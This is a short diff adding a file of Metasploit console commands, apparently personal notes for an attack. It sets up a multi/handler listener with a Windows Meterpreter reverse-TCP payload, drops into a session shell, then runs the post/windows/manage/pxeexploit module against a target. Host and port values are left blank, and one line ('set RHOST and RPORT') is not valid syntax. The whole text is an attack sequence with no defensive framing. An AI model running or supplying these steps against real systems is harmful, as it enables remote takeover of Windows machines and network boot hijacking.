@@ -1,0 +1,13 @@
+service postgresql start
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 
+set LPORT
+exploit
+sessions -i $session
+shell
+background
+use post/windows/manage/pxeexploit  
+set RHOST and RPORT
+exploit
+
